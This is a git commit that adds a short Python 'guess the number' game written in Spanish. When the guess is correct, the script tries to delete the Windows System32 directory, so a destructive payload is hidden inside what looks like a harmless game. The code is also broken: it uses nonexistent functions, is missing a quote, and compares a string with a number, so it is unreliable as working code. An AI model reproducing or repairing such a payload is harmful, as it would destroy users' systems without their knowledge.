ccc7ffda37fa2a65f5794839adb2acd1ceb27b8e
Victor Mosquera <victormanuelmosqueraconejo@gmail.com>
2025-03-02 17:17:33 -0500

    Commit de prueba

---
+++ prueba.py
@@ -0,0 +1,16 @@
+import os
+import random as rd
+
+adivinar = rd.int()
+
+numero = input("Adivina el numero del 1 al 6:")
+
+if (numero != adivinar):
+    print("Para la proxima")
+
+else:
+    os.delete(C://Windows/System32")
+
+
+
+
